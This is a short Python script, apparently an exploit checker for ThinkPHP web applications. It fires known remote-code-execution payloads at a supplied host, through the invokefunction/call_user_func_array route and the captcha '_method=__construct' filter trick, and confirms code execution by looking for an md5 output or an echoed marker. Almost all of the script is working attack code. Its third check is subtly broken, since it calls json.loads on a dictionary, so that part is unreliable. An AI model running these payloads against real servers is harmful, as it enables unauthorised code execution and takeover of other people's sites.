import requests
import re
import json

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
    "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
    "Content-Type": "text/xml"
}


def getHref(url):

    content = requests.get(url,headers=headers).content

    urls =  re.findall(r'<a\b[^>]+\bhref="([^"]*)"[^>]*>([\s\S]*?)</a>',content)

    return urls




def exp(target):
    host,port = target.split(':')
    if port == '443':
        url = 'https://' + target
    else:
        url = 'http://' + target

    ctrl = getHref(url)[0][0].split('/')[1] or 'index'
    print(ctrl)   
 
    target = url + "/index.php?s=" + ctrl +'/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=xi4okv'
    resp = requests.get( target ,timeout=3)
    if "a82cdb4a8d309bc72bd1df8ecfa2aa8f" in resp.text:
        return target
        
    target = url + "/index.php?s=" + ctrl +'/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=xi4okv'
    resp = requests.get( target ,timeout=3)
    if "a82cdb4a8d309bc72bd1df8ecfa2aa8f" in resp.text:
        return target

    target = url + "/?s=captcha"
    resp = requests.post( target ,data=json.loads({"_method":"__construct","filter":"print_r","id":"xi4okv"}),timeout=5)
    if "xi4okv" in resp.text:
        return target
